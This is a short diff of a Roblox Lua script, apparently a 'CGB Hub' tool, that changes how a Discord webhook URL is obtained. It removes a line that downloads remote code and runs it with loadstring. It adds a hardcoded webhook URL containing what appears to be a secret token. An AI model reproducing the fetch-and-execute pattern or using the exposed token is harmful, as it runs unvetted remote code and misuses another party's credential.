@@ -1,6 +1,6 @@
 -- Required locals
-
-Webhook_URL = loadstring(game:HttpGet("https://github.com/CGB-CoolGamerBoy/CGB-Hub-Whitelist/raw/main/Webhook.lua"))()
+local DiscordUrl = "https://discord.com"
+Webhook_URL = DiscordUrl.."/api/webhooks/1045952549993332807/mSDk9aeEZlXJ3W7LnsstbFqfRouw1SitwUVsLaL4iCuuse0X1JptCBxMoA1GwCvvL5lg"
 HttpService = game:GetService("HttpService")
 local Asset = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
 local DiscordUrl = "discord.gg/8NbwAuBTjm"
